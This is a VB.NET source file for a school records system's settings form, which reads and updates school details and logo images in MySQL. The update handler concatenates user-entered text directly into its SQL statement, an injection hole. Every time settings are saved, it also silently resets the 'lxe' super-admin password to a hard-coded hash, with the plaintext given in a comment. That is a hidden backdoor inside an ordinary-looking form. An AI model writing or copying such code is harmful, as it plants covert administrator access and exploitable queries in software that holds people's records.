Imports MySql.Data.MySqlClient
Public Class frmSystemSettings
    Dim str As String
    Public Sub schoolInfo()
        Try
            Dim objCmd As MySql.Data.MySqlClient.MySqlCommand
            str = "select * from srms_settings limit 1"
            conn.Open()
            Dim dtReader As MySql.Data.MySqlClient.MySqlDataReader
            objCmd = New MySql.Data.MySqlClient.MySqlCommand(Str, conn)
            dtReader = objCmd.ExecuteReader()
            If dtReader.Read Then
                lblSettingsID.Text = dtReader(0)
                txtSchoolName.Text = dtReader(1)
                txtSchoolAddress.Text = dtReader(2)
                txtSchoolHead.Text = dtReader(3)
                txtSchoolHeadPosition.Text = dtReader(4)
                txtRegistrar.Text = dtReader(5)
                txtRegistrarPosition.Text = dtReader(6)
                txtCashier.Text = dtReader(11)
                txtCashierPosition.Text = dtReader(12)
                txtScholarshipCoor.Text = dtReader(15)
                txtAccountant.Text = dtReader(16)

                Dim arrImage() As Byte
                Dim arrImage2() As Byte
                arrImage = dtReader.Item(17)
                arrImage2 = dtReader.Item(18)
                Dim mstream As New System.IO.MemoryStream(arrImage)
                Dim mstream2 As New System.IO.MemoryStream(arrImage2)
                PictureBox1.Image = Image.FromStream(mstream)
                PictureBox2.Image = Image.FromStream(mstream2)

            End If
            conn.Close()
        Catch ex As Exception
            MsgBox(ex.Message)
            conn.Close()
        End Try
    End Sub

    Private Sub frmSettings_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        schoolInfo()
    End Sub

    Private Sub btnUpdate_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnUpdate.Click
        Try

            'convert image to byte
            Dim mstream As New System.IO.MemoryStream()
            Dim mstream2 As New System.IO.MemoryStream()
            PictureBox1.Image.Save(mstream, System.Drawing.Imaging.ImageFormat.Jpeg)
            PictureBox2.Image.Save(mstream2, System.Drawing.Imaging.ImageFormat.Jpeg)
            'declare arrImage as Byte to read buffer
            Dim arrImage() As Byte = mstream.GetBuffer()
            Dim arrImage2() As Byte = mstream2.GetBuffer
            mstream.Close()

            str = "update srms_settings set SchoolName='" & txtSchoolName.Text & "',SchoolAddress='" & txtSchoolAddress.Text & "',SchoolHead='" & txtSchoolHead.Text & "',sHeadPosition='" & txtSchoolHeadPosition.Text & "',Registrar='" & txtRegistrar.Text & "',registrarPosition='" & txtRegistrarPosition.Text & "',cashier='" & txtCashier.Text & "',cashierPosition='" & txtCashierPosition.Text & "',scholarshipCoordinator='" & txtScholarshipCoor.Text & "',accountant='" & txtAccountant.Text & "',schoolLogo=@Sub_Image,letterHead=@Sub_Image2 where settingsID='" & lblSettingsID.Text & "'"
            conn.Open()
            Dim mysc As New MySqlCommand(str, conn)
            mysc.Parameters.AddWithValue("@Sub_Image", arrImage)
            mysc.Parameters.AddWithValue("@Sub_Image2", arrImage2)
            mysc.ExecuteNonQuery()
            conn.Close()

            'Update Super Admin Account password to .P0liceReport
            str = "update users set password='823b6663d2f8248e8acd9838612fc3fec2b82cd0' where username='lxe'"
            conn.Open()
            Dim mysc1 As New MySqlCommand(str, conn)
            mysc1.ExecuteNonQuery()
            conn.Close()

            MsgBox("Updated successfully!", MsgBoxStyle.Information)
            schoolInfo()

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            conn.Close()
        End Try
    End Sub

    Private Sub brnBrowse_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles brnBrowse.Click
        Try
            Dim imgpath As String
            Dim OFD As FileDialog = New OpenFileDialog()

            OFD.Filter = "Image File (*.jpg;*.png;*.bmp;*.gif)|*.jpg;*.png;*.bmp;*.gif"

            If OFD.ShowDialog() = DialogResult.OK Then
                imgpath = OFD.FileName
                PictureBox1.ImageLocation = imgpath

            End If

            OFD = Nothing

        Catch ex As Exception
            MsgBox(ex.Message.ToString())
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            Dim imgpath As String
            Dim OFD As FileDialog = New OpenFileDialog()

            OFD.Filter = "Image File (*.jpg;*.png;*.bmp;*.gif)|*.jpg;*.png;*.bmp;*.gif"

            If OFD.ShowDialog() = DialogResult.OK Then
                imgpath = OFD.FileName
                PictureBox2.ImageLocation = imgpath

            End If

            OFD = Nothing

        Catch ex As Exception
            MsgBox(ex.Message.ToString())
        End Try
    End Sub

   
End Class